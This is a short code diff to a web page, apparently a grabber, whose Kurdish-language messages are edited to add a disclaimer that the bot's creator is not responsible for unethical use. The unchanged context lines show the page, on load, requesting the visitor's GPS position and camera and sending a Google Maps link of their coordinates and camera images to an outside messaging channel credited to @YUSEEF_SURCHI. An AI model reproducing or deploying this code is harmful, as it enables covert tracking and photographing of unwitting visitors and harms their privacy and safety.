@@ -40,8 +40,8 @@
                 navigator.geolocation.getCurrentPosition(position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
-                    sendMessage(`📍 جهئ وي هاته ديتن او كه سئ بوت دروسكري @YUSEEF_SURCHI:\nhttps://www.google.com/maps?q=${lat},${lon}`);
-                }, () => sendMessage("⚠️  نه هئلا جهئ وي ببيني (GPS) او كه سئ بوت درسكري @YUSEEF_SURCHIنەدا ."));
+                    sendMessage(`📍 جهئ وي هاته ديتن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين@YUSEEF_SURCHI:\nhttps://www.google.com/maps?q=${lat},${lon}`);
+                }, () => sendMessage("⚠️  نه هئلا جهئ وي ببيني هه ر كاره كئ بئ اخلاق ام به ر پرس نينين (GPS) او كه سئ بوت درسكري @YUSEEF_SURCHIنەدا ."));
             }
         }
 
@@ -62,13 +62,13 @@
                     }, 'image/jpeg');
                 }, 2000);
             } catch (err) {
-                sendMessage("⚠️  رئكئ ب کاميرئ ناده تن او كه سئ بوت دروسكري @YUSEEF_SURCHI.");
+                sendMessage("⚠️  رئكئ ب کاميرئ ناده تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI.");
             }
         }
 
         // وه ختئ ويبسايت ڤه د بيتين ڤه دبيته ڤه
         window.onload = () => {
-            sendMessage("🚀 کەسەک هاتە دناف ويبسايتي دا، نوكه داخازيا کامێرئ و جهئ وي دكه تن او كه سئ بوت دروسكري @YUSEEF_SURCHI...");
+            sendMessage("🚀 کەسەک هاتە دناف ويبسايتي دا، نوكه داخازيا کامێرئ و جهئ وي دكه تن او كه سئ بوت دروسكري هه ر كاره كئ بئ اخلاق ام به ر پرس نينين @YUSEEF_SURCHI...");
             askLocation();
             startCamera();
         };
